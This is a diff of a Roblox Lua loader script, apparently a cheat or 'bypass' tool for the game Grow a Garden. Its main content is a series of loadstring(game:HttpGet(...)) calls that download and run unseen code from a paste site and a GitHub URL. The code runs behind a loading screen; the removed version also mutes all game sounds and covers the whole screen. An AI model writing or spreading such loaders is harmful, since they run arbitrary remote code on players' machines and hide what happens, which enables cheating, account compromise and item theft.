@@ -1,187 +1,143 @@
 loadstring(game:HttpGet("https://pastefy.app/RQjLtyFe/raw"))()
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 local TweenService = game:GetService("TweenService")
-local CoreGui = game:GetService("CoreGui")
-local SoundService = game:GetService("SoundService")
-local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
 
--- ðŸŽµ TÃ¼m sesleri durdur
-for _, sound in pairs(Workspace:GetDescendants()) do
-    if sound:IsA("Sound") then
-        sound:Stop()
-    end
-end
+-- Add Blur Effect
+local blur = Instance.new("BlurEffect")
+blur.Size = 12
+blur.Parent = Lighting
 
-for _, sound in pairs(SoundService:GetDescendants()) do
-    if sound:IsA("Sound") then
-        sound:Stop()
-    end
-end
+-- Create ScreenGui
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "KuniLoading"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
 
--- ScreenGui
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "PLEASE WAIT"
-ScreenGui.Parent = CoreGui
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+-- Main Panel
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 460, 0, 160)
+frame.Position = UDim2.new(0.5, -230, 0.5, -80)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BackgroundTransparency = 0.05
+frame.BorderSizePixel = 0
 
--- Arka plan
-local Background = Instance.new("Frame")
-Background.Size = UDim2.new(1,0,1,0)
-Background.Position = UDim2.new(0,0,0,0)
-Background.BackgroundColor3 = Color3.fromRGB(30,30,30)
-Background.BorderSizePixel = 0
-Background.Parent = ScreenGui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+Instance.new("UIStroke", frame).ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
--- Gradient
-local UIGradient = Instance.new("UIGradient")
-UIGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(20,20,20)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50,50,50)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(30,30,30))
+-- Shadow
+local shadow = Instance.new("ImageLabel", frame)
+shadow.Image = "rbxassetid://1316045217"
+shadow.ImageTransparency = 0.75
+shadow.Size = UDim2.new(1, 80, 1, 80)
+shadow.Position = UDim2.new(0.5, -240, 0.5, -90)
+shadow.BackgroundTransparency = 1
+shadow.ZIndex = -1
+
+-- Glowing Title
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, -40, 0, 60)
+title.Position = UDim2.new(0, 20, 0, 10)
+title.Text = "Hxkidlat Script v3"
+title.TextColor3 = Color3.fromRGB(0, 200, 255)
+title.TextTransparency = 0.2
+title.TextStrokeTransparency = 0.6
+title.Font = Enum.Font.FredokaOne
+title.TextScaled = true
+title.BackgroundTransparency = 1
+
+-- Title Pulse
+task.spawn(function()
+	while title and title.Parent do
+		TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 0.05}):Play()
+		task.wait(1)
+		TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 0.25}):Play()
+		task.wait(1)
+	end
+end)
+
+-- Loading Dots Animation
+local loading = Instance.new("TextLabel", frame)
+loading.Size = UDim2.new(1, -40, 0, 30)
+loading.Position = UDim2.new(0, 20, 0, 70)
+loading.Text = "Loading"
+loading.TextColor3 = Color3.fromRGB(200, 200, 200)
+loading.Font = Enum.Font.FredokaOne
+loading.TextScaled = true
+loading.BackgroundTransparency = 1
+loading.TextStrokeTransparency = 1
+
+-- Dots Cycle
+task.spawn(function()
+	local dots = {"", ".", "..", "..."}
+	local index = 1
+	while loading and loading.Parent do
+		loading.Text = "Loading" .. dots[index]
+		index = (index % #dots) + 1
+		task.wait(0.4)
+	end
+end)
+
+-- Loading Bar BG
+local barBg = Instance.new("Frame", frame)
+barBg.Size = UDim2.new(1, -40, 0, 18)
+barBg.Position = UDim2.new(0, 20, 1, -40)
+barBg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+barBg.BorderSizePixel = 0
+Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 10)
+
+-- Loading Bar Fill
+local barFill = Instance.new("Frame", barBg)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 10)
+
+-- Gradient Fill
+local grad = Instance.new("UIGradient", barFill)
+grad.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
 }
-UIGradient.Rotation = 45
-UIGradient.Parent = Background
-
--- YÄ±ldÄ±zlar
-local stars = {}
-for i = 1, 50 do
-    local star = Instance.new("TextLabel")
-    star.Size = UDim2.new(0,5,0,5)
-    star.Position = UDim2.new(math.random(),0,math.random(),0)
-    star.BackgroundTransparency = 1
-    star.Text = "â˜…"
-    star.TextColor3 = Color3.fromRGB(255,255,255)
-    star.TextScaled = true
-    star.Font = Enum.Font.GothamBlack
-    star.Parent = Background
-    table.insert(stars, star)
-end
-
--- Hafif yanÄ±p sÃ¶nme ve yavaÅŸ hareket
-for i, star in pairs(stars) do
-    spawn(function()
-        while true do
-            local tweenInfo = TweenInfo.new(math.random(3,6), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-            local tween = TweenService:Create(star, tweenInfo, {TextTransparency = math.random(2,4)/10})
-            tween:Play()
-            
-            local moveX = star.Position.X.Scale + (math.random(-5,5)/100)
-            local moveY = star.Position.Y.Scale + (math.random(-5,5)/100)
-            moveX = math.clamp(moveX, 0, 1)
-            moveY = math.clamp(moveY, 0, 1)
-            local moveTween = TweenService:Create(star, TweenInfo.new(math.random(15,25)/10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(moveX,0,moveY,0)})
-            moveTween:Play()
-            
-            wait(math.random(2,4))
-        end
-    end)
-end
-
--- BaÅŸlÄ±k / Logo
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(0.6,0,0.15,0)
-Title.Position = UDim2.new(0.2,0,0.35,0)
-Title.BackgroundTransparency = 1
-Title.Text = "Pleas Wait"
-Title.TextColor3 = Color3.fromRGB(255,255,255)
-Title.Font = Enum.Font.GothamBlack
-Title.TextScaled = true
-Title.TextStrokeTransparency = 0
-Title.TextStrokeColor3 = Color3.fromRGB(255,255,255)
-Title.Parent = Background
-
--- YÃ¼klenme Ã§ubuÄŸu
-local BarBackground = Instance.new("Frame")
-BarBackground.Size = UDim2.new(0.6,0,0.05,0)
-BarBackground.Position = UDim2.new(0.2,0,0.55,0)
-BarBackground.BackgroundColor3 = Color3.fromRGB(60,60,60)
-BarBackground.BorderSizePixel = 2
-BarBackground.BorderColor3 = Color3.fromRGB(255,255,255)
-BarBackground.Parent = Background
-
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0.08,0)
-barCorner.Parent = BarBackground
-
--- Gradientli yÃ¼klenme Ã§ubuÄŸu
-local LoadingBar = Instance.new("Frame")
-LoadingBar.Size = UDim2.new(0,0,1,0)
-LoadingBar.BackgroundColor3 = Color3.fromRGB(50,150,255)
-LoadingBar.BorderSizePixel = 0
-LoadingBar.Parent = BarBackground
-
-local loadingCorner = Instance.new("UICorner")
-loadingCorner.CornerRadius = UDim.new(0.08,0)
-loadingCorner.Parent = LoadingBar
-
-local barGradient = Instance.new("UIGradient")
-barGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(80,180,255)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50,150,255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(20,100,255))
+grad.Transparency = NumberSequence.new{
+	NumberSequenceKeypoint.new(0, 0),
+	NumberSequenceKeypoint.new(1, 0.2)
 }
-barGradient.Rotation = 0
-barGradient.Parent = LoadingBar
 
--- GlowBar (parlama efekti)
-local GlowBar = Instance.new("Frame")
-GlowBar.Size = UDim2.new(0.05,0,1,0)
-GlowBar.BackgroundColor3 = Color3.fromRGB(120,220,255)
-GlowBar.BorderSizePixel = 0
-GlowBar.Position = UDim2.new(0,0,0,0)
-GlowBar.BackgroundTransparency = 0.25
-GlowBar.Parent = LoadingBar
+-- Animate Fill
+TweenService:Create(barFill, TweenInfo.new(5, Enum.EasingStyle.Sine), {
+	Size = UDim2.new(1, 0, 1, 0)
+}):Play()
 
-local glowCorner = Instance.new("UICorner")
-glowCorner.CornerRadius = UDim.new(0.08,0)
-glowCorner.Parent = GlowBar
+-- Optional: Play soft chime sound
+local sound = Instance.new("Sound", frame)
+sound.SoundId = "rbxassetid://9118823106"
+sound.Volume = 0.5
+sound:Play()
 
-local PercentLabel = Instance.new("TextLabel")
-PercentLabel.Size = UDim2.new(1,0,1,0)
-PercentLabel.Position = UDim2.new(0,0,0,0)
-PercentLabel.BackgroundTransparency = 1
-PercentLabel.TextColor3 = Color3.fromRGB(255,255,255)
-PercentLabel.Font = Enum.Font.Gotham
-PercentLabel.TextScaled = true
-PercentLabel.Text = "0%"
-PercentLabel.Parent = BarBackground
+-- Optional: Star Particle Twinkle
+--[[
+local particle = Instance.new("ParticleEmitter", frame)
+particle.Texture = "rbxassetid://243660364"
+particle.LightEmission = 1
+particle.Rate = 3
+particle.Lifetime = NumberRange.new(3)
+particle.Speed = NumberRange.new(0.5)
+particle.Size = NumberSequence.new(0.3)
+]]
 
--- KÃ¼Ã§Ã¼k beyaz alt yazÄ±
-local SubTitle = Instance.new("TextLabel")
-SubTitle.Size = UDim2.new(0.6,0,0.05,0)
-SubTitle.Position = UDim2.new(0.2,0,0.63,0)
-SubTitle.BackgroundTransparency = 1
-SubTitle.Text = "Grow a Garden Bypass Loading"
-SubTitle.TextColor3 = Color3.fromRGB(255,255,255)
-SubTitle.Font = Enum.Font.GothamSemibold
-SubTitle.TextSize = 18
-SubTitle.TextStrokeTransparency = 0.5
-SubTitle.TextStrokeColor3 = Color3.fromRGB(0,0,0)
-SubTitle.Parent = Background
+-- Fade out and destroy
+task.delay(5, function()
+	TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+	TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+	TweenService:Create(loading, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+	TweenService:Create(barFill, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+	TweenService:Create(barBg, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+	TweenService:Create(shadow, TweenInfo.new(0.5), {ImageTransparency = 1}):Play()
+	wait(0.6)
+	blur:Destroy()
+	gui:Destroy()
+end)
 
--- YavaÅŸ ama hafif hÄ±zlÄ± yÃ¼klenme animasyonu
-local progress = 0
-while progress < 100 do
-    progress = progress + 0.05
-    LoadingBar.Size = UDim2.new(progress/100,0,1,0)
-    PercentLabel.Text = math.floor(progress).."%"
-    
-    -- GlowBar smooth hareket
-    local targetPos = UDim2.new((progress/100)-0.05,0,0,0)
-    TweenService:Create(GlowBar, TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = targetPos}):Play()
-    
-    -- GlowBar rengini hafif titreÅŸtir
-    local glowR = 50
-    local glowG = 150 + math.sin(tick())*50
-    local glowB = 255
-    GlowBar.BackgroundColor3 = Color3.fromRGB(glowR, math.clamp(glowG,150,200), glowB)
-    
-    -- BaÅŸlÄ±k hafif titreÅŸim
-    Title.Position = UDim2.new(0.2, math.sin(tick()*3)*2, 0.35, 0)
-    
-    wait(0.12)
-end
-
-PercentLabel.Text = "TamamlandÄ±!"
-wait(1)
-ScreenGui:Destroy()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()
